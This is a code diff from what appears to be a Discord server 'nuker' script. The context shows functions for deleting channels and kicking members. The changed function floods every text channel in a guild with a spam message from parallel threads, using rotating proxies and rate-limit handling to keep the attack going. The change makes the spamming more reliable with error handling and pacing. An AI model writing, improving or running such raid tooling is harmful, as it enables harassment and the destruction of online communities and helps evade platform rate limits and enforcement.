@@ -82,14 +82,26 @@ def delete_channels(guild_id, headers):
 def spam_channels(guild_id, headers):
     r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers, proxies=get_proxy())
     if r.status_code == 200:
-        for channel in r.json():
-            def send():
-                for _ in range(5):
-                    data = {"content": SPAM_MESSAGE}
-                    res = requests.post(f"https://discord.com/api/v10/channels/{channel['id']}/messages", headers=headers, json=data, proxies=get_proxy())
-                    if handle_rate_limit(res): continue
-                    print(f"[Spam] Sent in {channel['id']}")
-            threading.Thread(target=send).start()
+        channels = r.json()
+        for channel in channels:
+            if channel.get("type") == 0:
+                def send_spam(channel_id):
+                    for _ in range(5):  # The number of times a message is sent per channel.
+                        data = {"content": SPAM_MESSAGE}
+                        try:
+                            res = requests.post(f"https://discord.com/api/v10/channels/{channel_id}/messages", headers=headers, json=data, proxies=get_proxy())
+                            if handle_rate_limit(res):
+                                continue
+                            if res.status_code in [200, 201]:
+                                print(f"📢 Spam sent to Channel ID {channel_id}")
+                            else:
+                                print(f"⚠️ Failed to send spam to {channel_id} (Status {res.status_code})")
+                        except Exception as e:
+                            print(f"❌ Error sending to {channel_id}: {e}")
+                        time.sleep(0.5)  # تأخير بسيط للتفادي
+                threading.Thread(target=send_spam, args=(channel['id'],)).start()
+    else:
+        print("⚠️ Failed to fetch channels.")
 
 def kick_member(guild_id, user_id, headers):
     url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}"
